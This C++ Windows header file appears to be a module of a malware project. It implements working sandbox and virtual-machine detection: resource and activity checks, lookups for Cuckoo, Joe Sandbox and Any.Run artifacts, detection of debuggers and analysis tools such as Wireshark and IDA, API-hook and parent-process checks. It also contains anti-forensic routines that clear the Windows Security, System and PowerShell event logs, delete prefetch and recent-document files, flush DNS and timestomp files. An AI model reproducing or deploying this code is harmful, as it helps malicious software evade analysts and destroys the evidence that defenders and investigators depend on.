#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Psapi.h>
#include <Shlobj.h>
#include <intrin.h>
#include <cstdint>
#include <cstring>

#pragma comment(lib, "Psapi.lib")

#include "domain/common/PerformanceOptimizer.hpp"

namespace nuub::domain::anti {

// ── Environment Keying ─────────────────────────────────────────
// Checks if the environment looks like a real user's machine
// Returns true if the environment is SUSPICIOUS (should terminate)
class EnvironmentKeying {
public:
    // Screen resolution must be at least 1024x768
    static bool check_screen_resolution() {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        return (width < 1024 || height < 768);
    }

    // RAM must be at least 4GB
    static bool check_ram_size() {
        MEMORYSTATUSEX mem{};
        mem.dwLength = sizeof(mem);
        if (GlobalMemoryStatusEx(&mem)) {
            // Less than 4GB = suspicious
            return (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024);
        }
        return false;
    }

    // Disk size must be at least 80GB
    static bool check_disk_size() {
        ULARGE_INTEGER free_bytes, total_bytes;
        if (GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, nullptr)) {
            // Less than 80GB = suspicious
            return (total_bytes.QuadPart < 80ULL * 1024 * 1024 * 1024);
        }
        return false;
    }

    // Must have at least 2 CPU cores
    static bool check_cpu_cores() {
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        return (sysinfo.dwNumberOfProcessors < 2);
    }

    // Check for recent user activity (files modified in last 7 days)
    static bool check_recent_activity() {
        WIN32_FIND_DATAA fd{};
        HANDLE hFind = FindFirstFileA("C:\\Users\\*\\Desktop\\*", &fd);
        if (hFind == INVALID_HANDLE_VALUE) return true; // No users = suspicious

        bool found_recent = false;

        // Get current time as FILETIME
        FILETIME now_ft;
        GetSystemTimeAsFileTime(&now_ft);

        // Convert now to ULARGE_INTEGER for comparison
        ULARGE_INTEGER now_uli;
        now_uli.LowPart = now_ft.dwLowDateTime;
        now_uli.HighPart = now_ft.dwHighDateTime;

        // 30 days in 100-nanosecond intervals
        ULARGE_INTEGER thirty_days;
        thirty_days.QuadPart = 30ULL * 24 * 60 * 60 * 10000000ULL;

        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

            ULARGE_INTEGER file_uli;
            file_uli.LowPart = fd.ftLastWriteTime.dwLowDateTime;
            file_uli.HighPart = fd.ftLastWriteTime.dwHighDateTime;

            if (file_uli.QuadPart > (now_uli.QuadPart - thirty_days.QuadPart)) {
                found_recent = true;
                break;
            }
        } while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
        return !found_recent;
    }

    // Check for mouse movement (non-blocking, compares against last known position)
    // Call check_mouse_initial() first to capture baseline, then check_mouse_activity()
    static POINT last_mouse_pos_;
    static bool mouse_baseline_set_;

    static bool check_mouse_initial() {
        GetCursorPos(&last_mouse_pos_);
        mouse_baseline_set_ = true;
        return true;
    }

    static bool check_mouse_activity() {
        if (!mouse_baseline_set_) {
            return check_mouse_initial();
        }
        POINT current;
        GetCursorPos(&current);
        // If mouse hasn't moved since baseline, likely a sandbox
        bool frozen = (last_mouse_pos_.x == current.x && last_mouse_pos_.y == current.y);
        // Update baseline for next check
        last_mouse_pos_ = current;
        return frozen;
    }

    // Check number of installed programs
    static bool check_installed_programs() {
        HKEY hkey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            0, KEY_READ, &hkey) != ERROR_SUCCESS) {
            return false;
        }

        DWORD count = 0;
        char name[256];
        DWORD name_size = sizeof(name);

        while (RegEnumKeyExA(hkey, count, name, &name_size,
                             nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            count++;
            name_size = sizeof(name);
        }
        RegCloseKey(hkey);

        // Less than 20 installed programs = suspicious
        return (count < 20);
    }

    // Combined environment check
    static bool is_suspicious_environment() {
        return check_screen_resolution() ||
               check_ram_size() ||
               check_disk_size() ||
               check_cpu_cores() ||
               check_recent_activity();
    }
};

// ── Sandbox Detection ──────────────────────────────────────────
// Detects specific sandbox/analysis environments
class AntiSandbox {
public:
    // Check for sandbox-specific artifacts
    static bool check_sandbox_artifacts() {
        const char* artifacts[] = {
            // Cuckoo Sandbox
            "C:\\Cuckoo\\",
            "C:\\ProgramData\\Cuckoo\\",
            // Joe Sandbox
            "C:\\Joe\\",
            "C:\\Program Files\\Joe Sandbox\\",
            // Any.Run
            "C:\\Program Files\\any.run\\",
            // Hybrid Analysis
            "C:\\Program Files\\Hybrid Analysis\\",
            // REMnux
            "C:\\remnux\\",
            // FlareVM
            "C:\\flarevm\\",
            // Generic sandbox paths
            "C:\\sample\\",
            "C:\\malware\\",
            "C:\\tests\\",
            nullptr
        };

        for (int i = 0; artifacts[i] != nullptr; ++i) {
            DWORD attr = GetFileAttributesA(artifacts[i]);
            if (attr != INVALID_FILE_ATTRIBUTES) {
                return true;
            }
        }
        return false;
    }

    // Check for sandbox-specific processes (uses cached process list)
    static bool check_sandbox_processes() {
        static const std::vector<std::string> sandbox_procs = {
            "python.exe", "pyw.exe",
            "procmon.exe", "procmon64.exe", "processhacker.exe",
            "wireshark.exe", "dumpcap.exe", "fiddler.exe",
            "apimonitor.exe", "regshot.exe",
            "x96dbg.exe", "x32dbg.exe", "ollydbg.exe",
            "ida.exe", "ida64.exe", "ghidra.exe",
            "cheatengine.exe", "autoruns.exe", "tcpview.exe",
            "procexp.exe", "procexp64.exe", "dbgview.exe"
        };
        return perf::ProcessCache::instance().any_running(sandbox_procs);
    }

    // Check for common VM/sandbox DLLs
    static bool check_sandbox_dlls() {
        const char* dlls[] = {
            "SbieDll.dll",       // Sandboxie
            "SxIn.dll",          // Sandboxie
            "cuckoomon.dll",     // Cuckoo
            "pstorec.dll",       // SunBurst sandbox
            "vmcheck.dll",       // VirtualPC
            "wpespy.dll",        // WPE Pro
            nullptr
        };

        for (int i = 0; dlls[i] != nullptr; ++i) {
            if (GetModuleHandleA(dlls[i])) return true;
        }
        return false;
    }

    // Check for hooks on common APIs (sign of analysis)
    static bool check_api_hooks() {
        // Check if common functions are hooked
        // A hooked function typically starts with JMP or PUSH;RET
        const char* modules[] = {"kernel32.dll", "ntdll.dll", "user32.dll"};

        for (int m = 0; m < 3; ++m) {
            HMODULE hMod = GetModuleHandleA(modules[m]);
            if (!hMod) continue;

            // Check a few exported functions
            const char* funcs[] = {"VirtualAlloc", "CreateFileW", "WriteFile"};
            for (int f = 0; f < 3; ++f) {
                FARPROC proc = GetProcAddress(hMod, funcs[f]);
                if (!proc) continue;

                // Check first bytes for JMP (0xE9) or PUSH;RET pattern
                uint8_t* bytes = reinterpret_cast<uint8_t*>(proc);
                if (bytes[0] == 0xE9 || // JMP rel32
                    bytes[0] == 0xFF && bytes[1] == 0x25) { // JMP [addr]
                    return true;
                }
            }
        }
        return false;
    }

    // Check parent process (should be explorer.exe for normal execution)
    static bool check_parent_process() {
        typedef LONG (WINAPI* NtQueryInformationProcess_t)(
            HANDLE, ULONG, PVOID, ULONG, PULONG);

        auto pNtQIP = reinterpret_cast<NtQueryInformationProcess_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

        if (!pNtQIP) return false;

        // PROCESS_BASIC_INFORMATION
        struct PBI {
            HANDLE Reserved[2];
            PVOID BaseAddress;
            ULONG_PTR AffinityMask;
            LONG Priority;
            LONG BasePriority;
            HANDLE UniqueProcessId;
            HANDLE InheritedFromUniqueProcessId;
        } pbi{};

        LONG status = pNtQIP(
            GetCurrentProcess(), 0, &pbi, sizeof(pbi), nullptr);

        if (status != 0) return false;

        HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                     FALSE, static_cast<DWORD>(reinterpret_cast<uintptr_t>(pbi.InheritedFromUniqueProcessId)));
        if (!hParent) return false;

        char exe_path[MAX_PATH]{};
        DWORD size = MAX_PATH;
        bool suspicious = false;

        if (QueryFullProcessImageNameA(hParent, 0, exe_path, &size)) {
            const char* filename = strrchr(exe_path, '\\');
            if (filename) {
                filename++;
                // Parent should be explorer.exe for normal double-click execution
                // If parent is cmd.exe, powershell.exe, or sandbox tools = suspicious
                const char* suspicious_parents[] = {
                    "cmd.exe", "powershell.exe", "python.exe",
                    "wscript.exe", "cscript.exe", "mshta.exe",
                    "rundll32.exe", "regsvr32.exe",
                    nullptr
                };
                for (int i = 0; suspicious_parents[i] != nullptr; ++i) {
                    if (_stricmp(filename, suspicious_parents[i]) == 0) {
                        suspicious = true;
                        break;
                    }
                }
            }
        }

        CloseHandle(hParent);
        return suspicious;
    }

    // Check if running from a suspicious path
    static bool check_suspicious_path() {
        char exe_path[MAX_PATH]{};
        GetModuleFileNameA(nullptr, exe_path, MAX_PATH);

        const char* suspicious[] = {
            "\\Temp\\", "\\AppData\\Local\\Temp\\",
            "\\Downloads\\", "\\Desktop\\",
            "\\sample\\", "\\malware\\", "\\tests\\",
            "\\tmp\\", "\\tmp\\",
            nullptr
        };

        for (int i = 0; suspicious[i] != nullptr; ++i) {
            if (strstr(exe_path, suspicious[i]) != nullptr) {
                return true;
            }
        }
        return false;
    }

    // Combined sandbox check
    static bool is_sandbox() {
        return check_sandbox_artifacts() ||
               check_sandbox_processes() ||
               check_sandbox_dlls() ||
               check_api_hooks() ||
               check_parent_process() ||
               check_suspicious_path();
    }
};

// ── Anti-Forensic ──────────────────────────────────────────────
// Techniques to prevent forensic analysis
class AntiForensic {
public:
    // Clear Windows event logs
    static bool clear_event_logs() {
        const char* logs[] = {
            "Application", "Security", "System",
            "Setup", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational",
            nullptr
        };

        bool all_cleared = true;
        for (int i = 0; logs[i] != nullptr; ++i) {
            HANDLE hLog = OpenEventLogA(nullptr, logs[i]);
            if (hLog) {
                if (!ClearEventLogA(hLog, nullptr)) {
                    all_cleared = false;
                }
                CloseEventLog(hLog);
            }
        }
        return all_cleared;
    }

    // Clear prefetch files (evidence of execution)
    static bool clear_prefetch() {
        WIN32_FIND_DATAA fd{};
        HANDLE hFind = FindFirstFileA("C:\\Windows\\Prefetch\\*", &fd);
        if (hFind == INVALID_HANDLE_VALUE) return false;

        int cleared = 0;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

            std::string path = "C:\\Windows\\Prefetch\\";
            path += fd.cFileName;

            if (DeleteFileA(path.c_str())) {
                cleared++;
            }
        } while (FindNextFileA(hFind, &fd));

        FindClose(hFind);
        return cleared > 0;
    }

    // Timestomp a file (set creation/modification times to match system files)
    static bool timestomp(const std::string& file_path) {
        // Get times from a system file (kernel32.dll)
        WIN32_FIND_DATAA sys_fd{};
        HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\kernel32.dll", &sys_fd);
        if (hFind == INVALID_HANDLE_VALUE) return false;
        FindClose(hFind);

        HANDLE hFile = CreateFileA(file_path.c_str(), GENERIC_WRITE,
                                   FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        bool result = SetFileTime(hFile, &sys_fd.ftCreationTime,
                                  &sys_fd.ftLastAccessTime, &sys_fd.ftLastWriteTime);

        CloseHandle(hFile);
        return result;
    }

    // Clear DNS cache
    static bool clear_dns_cache() {
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        wchar_t cmd[] = L"ipconfig /flushdns";
        bool result = CreateProcessW(nullptr, cmd,
                                     nullptr, nullptr, FALSE,
                                     CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (result) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        return result;
    }

    // Clear recent documents
    static bool clear_recent_docs() {
        char path[MAX_PATH]{};
        if (SHGetFolderPathA(nullptr, CSIDL_RECENT, nullptr, 0, path) == S_OK) {
            WIN32_FIND_DATAA fd{};
            std::string search = std::string(path) + "\\*";
            HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
            if (hFind == INVALID_HANDLE_VALUE) return false;

            int cleared = 0;
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                std::string file = std::string(path) + "\\" + fd.cFileName;
                if (DeleteFileA(file.c_str())) cleared++;
            } while (FindNextFileA(hFind, &fd));

            FindClose(hFind);
            return cleared > 0;
        }
        return false;
    }

    // Clear all anti-forensic traces
    static void clear_traces() {
        clear_event_logs();
        clear_prefetch();
        clear_dns_cache();
        clear_recent_docs();
    }
};

} // namespace nuub::domain::anti

// Static member definitions
namespace nuub::domain::anti {
    inline POINT EnvironmentKeying::last_mouse_pos_ = {0, 0};
    inline bool EnvironmentKeying::mouse_baseline_set_ = false;
}
#endif
